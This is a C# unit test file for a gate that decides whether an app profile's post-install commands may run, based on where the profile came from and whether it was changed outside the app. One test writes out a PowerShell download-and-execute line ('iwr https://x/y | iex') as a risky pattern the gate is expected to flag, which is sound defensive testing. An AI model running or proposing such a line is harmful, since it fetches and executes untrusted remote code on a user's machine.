// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (c) 2026 iam-groot1

using CtrlZ.Core.Install;
using CtrlZ.Core.Models;

namespace CtrlZ.Core.Tests;

public class ProfileOriginAndGateTests
{
    private static string NewDir()
    {
        var path = Path.Combine(Path.GetTempPath(), "ctrlz-pog-" + Guid.NewGuid().ToString("n")[..8]);
        Directory.CreateDirectory(path);
        return path;
    }

    private static AppProfile ProfileWithCommand(string? id = null)
    {
        var profile = new AppProfile { Id = id ?? "p-" + Guid.NewGuid().ToString("n")[..6], Name = "P" };
        profile.Apps.Add(new AppEntry
        {
            Id = "a1",
            Name = "App",
            Enabled = true,
            PostInstall = new PostInstallCommand
            {
                Executable = "cmd.exe",
                Arguments = new List<string> { "/c", "echo", "hi" },
                Enabled = true
            }
        });
        return profile;
    }

    private static PostInstallCommandGate Gate(ProfileOriginStore origins, string dir) =>
        new(origins, new PostInstallApprovalStore(Path.Combine(dir, "approvals.json")));

    [Fact]
    public void A_missing_entry_is_unknown_and_blocked()
    {
        var dir = NewDir();
        var origins = new ProfileOriginStore(Path.Combine(dir, "origins.json"));
        var profile = ProfileWithCommand();

        Assert.Equal(ProfileOrigin.Unknown, origins.Get(profile.Id));
        Assert.Equal(CommandDecision.BlockedUntrusted, Gate(origins, dir).Evaluate(profile).Single().Decision);
    }

    [Fact]
    public void A_deleted_origin_file_blocks()
    {
        var dir = NewDir();
        var path = Path.Combine(dir, "origins.json");
        var origins = new ProfileOriginStore(path);
        var profile = ProfileWithCommand();
        ProfileOriginRecorder.RecordCreated(origins, profile);
        Assert.Equal(CommandDecision.Run, Gate(origins, dir).Evaluate(profile).Single().Decision);

        File.Delete(path);
        var reopened = new ProfileOriginStore(path);

        Assert.Equal(ProfileOrigin.Unknown, reopened.Get(profile.Id));
        Assert.Equal(CommandDecision.BlockedUntrusted, Gate(reopened, dir).Evaluate(profile).Single().Decision);
    }

    [Fact]
    public void A_corrupt_origin_file_blocks()
    {
        var dir = NewDir();
        var path = Path.Combine(dir, "origins.json");
        var origins = new ProfileOriginStore(path);
        var profile = ProfileWithCommand();
        ProfileOriginRecorder.RecordCreated(origins, profile);

        File.WriteAllText(path, "{ this is not json ");
        var reopened = new ProfileOriginStore(path);

        Assert.Equal(ProfileOrigin.Unknown, reopened.Get(profile.Id));
        Assert.Equal(CommandDecision.BlockedUntrusted, Gate(reopened, dir).Evaluate(profile).Single().Decision);
    }

    [Fact]
    public void A_local_entry_for_another_profile_does_not_apply()
    {
        var dir = NewDir();
        var origins = new ProfileOriginStore(Path.Combine(dir, "origins.json"));
        origins.Set("someone-else", ProfileOrigin.Local, "hash");

        var profile = ProfileWithCommand();

        Assert.Equal(ProfileOrigin.Unknown, origins.Get(profile.Id));
        Assert.Equal(CommandDecision.BlockedUntrusted, Gate(origins, dir).Evaluate(profile).Single().Decision);
    }

    [Fact]
    public void An_explicit_local_entry_runs()
    {
        var dir = NewDir();
        var origins = new ProfileOriginStore(Path.Combine(dir, "origins.json"));
        var profile = ProfileWithCommand();
        ProfileOriginRecorder.RecordCreated(origins, profile);

        Assert.Equal(ProfileOrigin.Local, origins.Get(profile.Id));
        Assert.Equal(CommandDecision.Run, Gate(origins, dir).Evaluate(profile).Single().Decision);
    }

    [Fact]
    public void Editing_a_local_file_outside_the_app_makes_it_untrusted()
    {
        var dir = NewDir();
        var origins = new ProfileOriginStore(Path.Combine(dir, "origins.json"));
        var profile = ProfileWithCommand();
        ProfileOriginRecorder.RecordSaved(origins, profile);

        // Someone edits the file on disk: the content no longer matches the recorded save hash.
        profile.Apps[0].PostInstall!.Arguments.Add("--extra");

        ProfileOriginRecorder.LoadForUse(origins, profile);

        Assert.Equal(ProfileOrigin.Imported, origins.Get(profile.Id));
        Assert.Equal(CommandDecision.BlockedUntrusted, Gate(origins, dir).Evaluate(profile).Single().Decision);
    }

    [Fact]
    public void An_unchanged_local_file_stays_local_when_loaded()
    {
        var dir = NewDir();
        var origins = new ProfileOriginStore(Path.Combine(dir, "origins.json"));
        var profile = ProfileWithCommand();
        ProfileOriginRecorder.RecordSaved(origins, profile);

        ProfileOriginRecorder.LoadForUse(origins, profile);

        Assert.Equal(ProfileOrigin.Local, origins.Get(profile.Id));
        Assert.Equal(CommandDecision.Run, Gate(origins, dir).Evaluate(profile).Single().Decision);
    }

    [Fact]
    public void An_imported_profile_stays_imported_when_saved()
    {
        var dir = NewDir();
        var origins = new ProfileOriginStore(Path.Combine(dir, "origins.json"));
        var profile = ProfileWithCommand();
        origins.Set(profile.Id, ProfileOrigin.Imported, null);

        ProfileOriginRecorder.RecordSaved(origins, profile);

        Assert.Equal(ProfileOrigin.Imported, origins.Get(profile.Id));
    }

    [Fact]
    public void Marking_a_profile_local_requires_explicit_confirmation()
    {
        var dir = NewDir();
        var origins = new ProfileOriginStore(Path.Combine(dir, "origins.json"));
        var profile = ProfileWithCommand();

        ProfileOriginRecorder.MarkAsLocal(origins, profile, userConfirmed: false);
        Assert.Equal(ProfileOrigin.Unknown, origins.Get(profile.Id));

        ProfileOriginRecorder.MarkAsLocal(origins, profile, userConfirmed: true);
        Assert.Equal(ProfileOrigin.Local, origins.Get(profile.Id));
    }

    [Fact]
    public void A_risky_pattern_requires_confirmation_even_for_a_local_profile()
    {
        var dir = NewDir();
        var origins = new ProfileOriginStore(Path.Combine(dir, "origins.json"));
        var profile = ProfileWithCommand();
        profile.Apps[0].PostInstall = new PostInstallCommand
        {
            Executable = "powershell.exe",
            Arguments = new List<string> { "-NoProfile", "-Command", "iwr https://x/y | iex" },
            Enabled = true
        };
        ProfileOriginRecorder.RecordCreated(origins, profile);

        var verdict = Gate(origins, dir).Evaluate(profile).Single();

        Assert.Equal(CommandDecision.RiskyNeedsConfirmation, verdict.Decision);
        Assert.NotEmpty(verdict.Risks);
    }

    [Fact]
    public void Only_the_recorder_may_deserialize_a_profile()
    {
        // Source-scanning architecture test: any new loader that deserializes an AppProfile itself
        // bypasses origin recording, so it must go through ProfileOriginRecorder instead.
        var root = FindRepoRoot();
        Assert.NotNull(root);

        var allowed = new[]
        {
            Path.Combine("src", "CtrlZ.Core", "Services", "ProfileStore.cs"),
            Path.Combine("src", "CtrlZ.Core", "Install", "ProfileOriginRecorder.cs")
        };

        var offenders = Directory
            .EnumerateFiles(Path.Combine(root!, "src"), "*.cs", SearchOption.AllDirectories)
            .Where(file => File.ReadAllText(file).Contains("Deserialize<AppProfile>", StringComparison.Ordinal))
            .Select(file => Path.GetRelativePath(root!, file))
            .Where(relative => !allowed.Contains(relative, StringComparer.OrdinalIgnoreCase))
            .ToList();

        Assert.Empty(offenders);
    }

    private static string? FindRepoRoot()
    {
        var directory = new DirectoryInfo(AppContext.BaseDirectory);
        while (directory is not null)
        {
            if (File.Exists(Path.Combine(directory.FullName, "CTRL+Z.sln")))
            {
                return directory.FullName;
            }

            directory = directory.Parent;
        }

        return null;
    }
}
